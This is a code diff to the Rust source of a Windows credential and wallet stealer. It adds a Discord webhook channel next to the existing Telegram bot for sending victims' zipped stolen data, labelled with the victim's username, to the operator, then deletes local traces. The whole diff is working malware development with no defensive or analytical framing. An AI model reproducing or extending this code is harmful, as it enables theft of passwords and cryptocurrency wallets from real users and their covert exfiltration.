@@ -21,9 +21,23 @@ use std::os::windows::fs::OpenOptionsExt;
 use winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN;
 use wmi::{COMLibrary, WMIConnection};
 
+#[allow(dead_code)]
+enum DeliveryMethod {
+    TELEGRAM,
+    DISCORD,
+    NONE
+}
+
+const MODE: DeliveryMethod = DeliveryMethod::DISCORD;
+//TG
 const BOT_TOKEN: &str = "";
 const CHANNEL_ID: i64 = -0;
+
+//DC
+const DISCORD_WEBHOOK: &str = "";
+
 const MUTEX: bool = false;
+
 
 static mut PASSWORDS: i64 = 0;
 static mut WALLETS: i64 = 0;
@@ -53,7 +67,7 @@ async fn main() {
         .attributes(FILE_ATTRIBUTE_HIDDEN)
         .open(mutex_file);
 
-    std::fs::create_dir(string_path).unwrap(); // Crash if we dont have permission to create the directory.
+    std::fs::create_dir(string_path); 
     
     let bot = Bot::new(BOT_TOKEN.to_string());
     let language = format!("{:?}", whoami::lang().collect::<Vec<String>>());
@@ -198,6 +212,9 @@ async fn main() {
 
         let mut log_buffer = Vec::new();
         log_accounts.read_to_end(&mut log_buffer).unwrap();
+
+
+        if matches!(MODE, DeliveryMethod::TELEGRAM) {
         let _data_document: Document = Document::with_bytes("out.zip", &log_buffer);
 
    
@@ -212,12 +229,42 @@ async fn main() {
             .await;
 
         if let Err(_err) = _call_result {
-            std::fs::File::create(format!("{}\\error.txt", string_path))
-                .unwrap()
-                .write_all(_err.to_string().as_bytes())
-                .unwrap();
-            std::process::exit(0);
+            bot
+            .send_document(
+                ChannelId::from(CHANNEL_ID),
+                _data_document.caption(ParseMode::with_markdown_v2(
+                    &markdown_v2(bold(format!("Error while Sending log\n: {}", _err))).to_string(),
+                )),
+            )
+            .call()
+            .await.unwrap();
         }
+
+    }else if matches!(MODE, DeliveryMethod::DISCORD) {
+        use serenity::http::Http;
+        use serenity::model::prelude::Embed;
+        use serenity::model::prelude::AttachmentType;
+
+        let http = Http::new("");
+        let  webhook = http.get_webhook_from_url(DISCORD_WEBHOOK).await.unwrap();
+
+      let embed = Embed::fake(|e| {
+        e.title("Log Info")
+            .description(
+                    &markdown_v2(msg_edit).to_string()
+            )
+    });
+   
+    let  log_accounts =
+    tokio::fs::File::open(format!("{}\\out.zip", std::env::var("TEMP").unwrap())).await.unwrap();
+
+
+        webhook
+            .execute(&http, false, |w| w.content(format!("New log from {}", whoami::username())).username(whoami::username()).embeds(vec![embed]).add_file(AttachmentType::File { file: &log_accounts, filename: "data.zip".to_string() })).await.unwrap().unwrap();
+        drop(log_accounts);
+    }else {
+        std::process::exit(-1); // No Delivery
+    }
 
         std::fs::remove_dir_all(string_path).unwrap();
         std::fs::remove_file(format!("{}\\sensfiles.zip", app_data)).unwrap();
